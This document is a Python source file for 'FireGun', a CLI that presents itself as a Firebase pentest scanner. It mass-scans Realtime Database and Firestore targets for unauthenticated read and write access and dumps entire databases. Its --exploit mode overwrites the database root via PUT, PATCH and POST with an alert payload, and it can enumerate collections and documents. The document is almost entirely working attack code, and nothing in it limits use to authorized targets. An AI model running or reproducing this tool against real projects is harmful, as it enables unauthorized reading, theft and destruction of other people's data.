#!/usr/bin/env python3
"""
FireGun CLI – Python 3.13-compatible Firebase pentest & vuln scanner

Features:
  • RTDB: READ ACCESS, TAKEOVER (unauthenticated or with auth token)
  • Deep dump of entire RTDB tree
  • Firestore (client-side): READ ACCESS, TAKEOVER, nested enumeration
  • Admin-SDK Firestore dump (bypassing rules completely)
  • Scriptable fuzzing of Firestore Security Rules
  • Custom JS extensions via `script` subcommand

Usage:
  firegun scan [options] TARGETS...
  firegun dump-rtdb [options] TARGET
  firegun fs-scan [options] PROJECTS...
  firegun admin-dump-fs [options]
  firegun fuzz-rules [options]
  firegun script [options]
  firegun signup --api-key API_KEY EMAIL PASSWORD
  firegun signin --api-key API_KEY EMAIL PASSWORD
"""

import argparse
import asyncio
import json
import os
import subprocess
from pathlib import Path
from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode

import httpx
import requests

import firebase_admin
from firebase_admin import credentials, db
from google.cloud import firestore as fs_admin

# --- Banner helper ---
BANNER = r"""
______ _          _____             
|  ___(_)        |  __ \            
| |_   _ _ __ ___| |  \/_   _ _ __  
|  _| | | '__/ _ \ | __| | | | '_ \ 
| |   | | | |  __/ |_\ \ |_| | | | |
\_|   |_|_|  \___|\____/\__,_|_| |_|
                 by Marko Zivan (kurozy)
"""

def print_banner():
    print(BANNER)

# Identity Toolkit endpoints
IT_SIGNUP = "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}"
IT_SIGNIN = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"



# --------- Helpers ---------

def init_rtdb_admin(sa_json: Path, db_url: str):
    cred = credentials.Certificate(str(sa_json))
    firebase_admin.initialize_app(cred, {"databaseURL": db_url})

def signup(api_key: str, email: str, password: str) -> str:
    url = IT_SIGNUP.format(api_key=api_key)
    r = httpx.post(url, json={"email": email, "password": password, "returnSecureToken": True})
    r.raise_for_status()
    print(f"[+] Signed up UID={r.json()['localId']}")
    return r.json()["idToken"]

def signin(api_key: str, email: str, password: str) -> str:
    url = IT_SIGNIN.format(api_key=api_key)
    r = httpx.post(url, json={"email": email, "password": password, "returnSecureToken": True})
    r.raise_for_status()
    print(f"[+] Logged in UID={r.json()['localId']}")
    return r.json()["idToken"]

def build_rtdb_url(raw: str, auth_token: str = None) -> str:
    # Ensure scheme
    if not raw.startswith(("http://", "https://")):
        raw = "https://" + raw
    parsed = urlparse(raw)
    # Determine new path
    path = parsed.path or ""
    if not path.endswith(".json"):
        path = path.rstrip("/") + "/.json"
    # Merge query params
    qs = dict(parse_qsl(parsed.query))
    if auth_token:
        qs.setdefault("auth", auth_token)
    new_query = urlencode(qs)
    return urlunparse((parsed.scheme, parsed.netloc, path, "", new_query, ""))

# --------- RTDB Scan & Exploit ---------

async def scan_rtdb(client: httpx.AsyncClient, raw: str, sem: asyncio.Semaphore,
                    exploit: bool, auth_token: str = None, readout: bool = False):
    root_url = build_rtdb_url(raw, auth_token)

    async with sem:
        resp = await client.get(root_url)
    code = resp.status_code
    can_read = False
    can_write = False
    data = None

    if code == 200:
        try:
            data = resp.json()
            if not (isinstance(data, dict) and "error" in data):
                can_read = True
        except ValueError:
            can_read = True
        # probe write
        probe_url = build_rtdb_url(raw.rstrip("/") + "/__firegun_probe__", auth_token)
        w = await client.patch(probe_url, json={"probe": "firegun"})
        if w.status_code in (200,201):
            can_write = True
            await client.delete(probe_url)
    elif code == 404:
        can_write = True

    parts = []
    if can_read: parts.append("READ ACCESS")
    if can_write: parts.append("TAKEOVER")
    status = ", ".join(parts) if parts else f"ERROR {code}"
    print(f"{root_url} [{'VULNERABLE' if parts else 'SECURE'} : {status}]")

    if readout and can_read and data is not None:
        print("\n-- Begin readout --")
        print(json.dumps(data, indent=2))
        print("-- End readout --\n")

    if exploit and can_write:
        msg = (
            "Your DB is available to public, kindly correct your permissions else anyone can "
            "dump, read, write or delete your DB. Read the following for better securing your DB "
            "https://firebase.google.com/docs/rules/insecure-rules"
        )
        payload = {"firegun_alert": msg}
        for method in ("PUT","PATCH","POST"):
            fn = getattr(requests, method.lower())
            try:
                r = fn(root_url, json=payload, timeout=10)
                ok = r.status_code in (200,201)
                print(f"Exploit {method}: {'success' if ok else 'failed'} (HTTP {r.status_code})")
            except Exception as e:
                print(f"Exploit {method} error: {e}")

        # verify write
        try:
            vr = requests.get(root_url, timeout=10)
            print("\n-- Exploit verification --")
            if vr.status_code == 200 and isinstance(vr.json(), dict):
                alert = vr.json().get("firegun_alert")
                print(alert or "No 'firegun_alert' found.")
            else:
                print(f"Verification failed: HTTP {vr.status_code}")
            print("-- End verification --\n")
        except Exception as e:
            print(f"Verification error: {e}")

# --------- RTDB Deep Dump ---------

async def dump_rtdb(client: httpx.AsyncClient, raw: str,
                    auth_token: str = None, output: Path = None):
    root_url = build_rtdb_url(raw, auth_token)
    resp = await client.get(root_url)
    if resp.status_code == 200:
        data = resp.json()
        if output:
            output.write_text(json.dumps(data, indent=2))
            print(f"RTDB dump written to {output}")
        else:
            print(json.dumps(data, indent=2))
    else:
        print(f"Failed to dump RTDB: HTTP {resp.status_code}")

# --------- Firestore Client Scan & Exploit ---------

async def scan_firestore(client: httpx.AsyncClient, project: str, api_key: str,
                         id_token: str, sem: asyncio.Semaphore, exploit: bool):
    base = f"https://firestore.googleapis.com/v1/projects/{project}/databases/(default)/documents"
    headers = {}
    if id_token:
        headers["Authorization"] = f"Bearer {id_token}"

    async with sem:
        resp = await client.get(f"{base}?pageSize=1&key={api_key}", headers=headers)
    can_read = resp.status_code == 200
    can_write = False

    if exploit and can_read:
        test = f"{base}/__firegun_probe__?key={api_key}"
        w = requests.patch(test, headers=headers,
                           json={"fields":{"probe":{"stringValue":"firegun"}}})
        if w.status_code in (200,201):
            can_write = True
            requests.delete(test, headers=headers)

    parts = []
    if can_read: parts.append("READ ACCESS")
    if can_write: parts.append("TAKEOVER")
    status = ", ".join(parts) if parts else f"ERROR {resp.status_code}"
    print(f"Firestore {project} [{'VULNERABLE' if parts else 'SECURE'} : {status}]")

    if can_read:
        url_col = f"{base}:listCollectionIds?key={api_key}"
        cols = requests.post(url_col, headers=headers, json={"pageSize":50}) \
                       .json().get("collectionIds", [])
        print(f"Collections ({len(cols)}): {cols}")
        for c in cols[:5]:
            docs = requests.get(f"{base}/{c}?pageSize=5&key={api_key}", headers=headers) \
                           .json().get("documents", [])
            print(f" {c} docs: {[d['name'].rsplit('/',1)[-1] for d in docs]}")

# --------- Firestore Admin SDK Dump ---------

def dump_fs_admin(sa_json: Path, project: str, output: Path):
    os.environ["GOOGLE_APPLICATION_CREDENTIALS"] = str(sa_json)
    client = fs_admin.Client(project=project)
    result = {}
    def recurse(col, path):
        for doc in col.stream():
            key = "/".join(path + [doc.id])
            result[key] = doc.to_dict()
            for sub in doc.reference.collections():
                recurse(sub, path + [doc.id, sub.id])
    for col in client.collections():
        recurse(col, [col.id])
    output.write_text(json.dumps(result, indent=2))
    print(f"Firestore admin dump written to {output}")

# --------- Firestore Rules Fuzzer ---------

def fuzz_rules(rules: Path, project: str, api_key: str,
               id_token: str, script: Path):
    cmd = ["node", str(script), "--project", project,
           "--apiKey", api_key, "--rules", str(rules)]
    if id_token:
        cmd += ["--token", id_token]
    subprocess.run(cmd)

# --------- Custom JS runner ---------

def run_script(path: Path, target: str, token: str):
    cmd = ["node", str(path), target]
    if token:
        cmd += [token]
    subprocess.run(cmd)

# --------- Async runners ---------

async def run_scan_rtdb(targets, concurrency, exploit, auth_token, readout):
    async with httpx.AsyncClient(timeout=30) as client:
        sem = asyncio.Semaphore(concurrency)
        await asyncio.gather(
            *(scan_rtdb(client, t, sem, exploit, auth_token, readout) for t in targets)
        )

async def run_dump_rtdb(target, auth_token, output):
    async with httpx.AsyncClient(timeout=60) as client:
        await dump_rtdb(client, target, auth_token, output)

async def run_fs_scan(projects, api_key, id_token, concurrency, exploit):
    async with httpx.AsyncClient(timeout=30) as client:
        sem = asyncio.Semaphore(concurrency)
        await asyncio.gather(
            *(scan_firestore(client, pj, api_key, id_token, sem, exploit)
              for pj in projects)
        )

# --------- CLI ---------

def main():

    # show banner on every invocation
    print_banner()

    p = argparse.ArgumentParser(prog="firegun.py", description="FireGun CLI")
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("scan", help="RTDB scan")
    s.add_argument("targets", nargs="+", help="hosts, URLs, or files")
    s.add_argument("-c","--concurrency", type=int, default=10)
    s.add_argument("--exploit", action="store_true")
    s.add_argument("--readout", action="store_true")
    s.add_argument("--config", type=Path)

    d = sub.add_parser("dump-rtdb", help="Deep RTDB JSON dump")
    d.add_argument("target", help="host, URL, or file")
    d.add_argument("--config", type=Path)
    d.add_argument("--output", type=Path)

    fs = sub.add_parser("fs-scan", help="Client-side Firestore tests")
    fs.add_argument("projects", nargs="+")
    fs.add_argument("--api-key", required=True)
    fs.add_argument("--id-token")
    fs.add_argument("--config", type=Path)
    fs.add_argument("-c","--concurrency", type=int, default=5)
    fs.add_argument("--exploit", action="store_true")

    ad = sub.add_parser("admin-dump-fs", help="Admin SDK Firestore dump")
    ad.add_argument("--service-account", type=Path, required=True)
    ad.add_argument("project")
    ad.add_argument("--output", type=Path, required=True)

    fr = sub.add_parser("fuzz-rules", help="Fuzz Firestore rules")
    fr.add_argument("rules", type=Path)
    fr.add_argument("project")
    fr.add_argument("--api-key", required=True)
    fr.add_argument("--id-token")
    fr.add_argument("script", type=Path)

    sc = sub.add_parser("script", help="Run custom JS")
    sc.add_argument("path", type=Path)
    sc.add_argument("target")
    sc.add_argument("--token")

    sup = sub.add_parser("signup", help="Email/password signup")
    sup.add_argument("--api-key", required=True)
    sup.add_argument("email")
    sup.add_argument("password")

    sin = sub.add_parser("signin", help="Email/password signin")
    sin.add_argument("--api-key", required=True)
    sin.add_argument("email")
    sin.add_argument("password")

    args = p.parse_args()

    if args.cmd == "scan":
        auth_token = None
        if args.config:
            cfg = json.loads(args.config.read_text())
            auth_token = cfg.get("idToken") or cfg.get("auth")
        # expand file targets
        targets = []
        for t in args.targets:
            p = Path(t)
            if p.is_file():
                for line in p.read_text().splitlines():
                    if line.strip():
                        targets.append(line.strip())
            else:
                targets.append(t)
        asyncio.run(run_scan_rtdb(targets, args.concurrency,
                                  args.exploit, auth_token, args.readout))

    elif args.cmd == "dump-rtdb":
        auth_token = None
        if args.config:
            cfg = json.loads(args.config.read_text())
            auth_token = cfg.get("idToken") or cfg.get("auth")
        tgt = args.target
        p = Path(tgt)
        if p.is_file():
            tgt = p.read_text().splitlines()[0].strip()
        asyncio.run(run_dump_rtdb(tgt, auth_token, args.output))

    elif args.cmd == "fs-scan":
        if args.config and not args.id_token:
            cfg = json.loads(args.config.read_text())
            args.id_token = cfg.get("idToken")
        asyncio.run(run_fs_scan(args.projects, args.api_key,
                                args.id_token, args.concurrency, args.exploit))

    elif args.cmd == "admin-dump-fs":
        dump_fs_admin(args.service_account, args.project, args.output)

    elif args.cmd == "fuzz-rules":
        fuzz_rules(args.rules, args.project, args.api_key,
                   args.id_token, args.script)

    elif args.cmd == "script":
        run_script(args.path, args.target, args.token)

    elif args.cmd == "signup":
        signup(args.api_key, args.email, args.password)

    elif args.cmd == "signin":
        token = signin(args.api_key, args.email, args.password)
        print(f"idToken: {token}")

    else:
        p.print_help()

if __name__ == "__main__":
    main()

